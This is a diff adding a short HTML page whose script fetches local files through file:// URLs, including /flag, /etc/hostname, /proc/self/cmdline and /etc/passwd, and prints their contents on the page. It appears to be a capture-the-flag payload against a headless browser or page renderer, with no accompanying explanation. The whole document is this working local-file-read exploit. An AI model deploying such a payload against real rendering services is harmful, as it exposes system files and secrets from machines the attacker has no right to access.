@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html><body>
+<pre id="o">loading...</pre>
+<script>
+(async () => {
+  const targets = ['file:///flag','file:///flag.txt','file:///etc/hostname','file:///proc/self/cmdline','file:///etc/passwd'];
+  let out = '';
+  for (const t of targets) {
+    try {
+      const r = await fetch(t);
+      out += '=== ' + t + ' ===\n' + (await r.text()) + '\n\n';
+    } catch (e) {
+      out += '=== ' + t + ' ===\nERR ' + e + '\n\n';
+    }
+  }
+  document.getElementById('o').innerText = out;
+})();
+</script>
+</body></html>
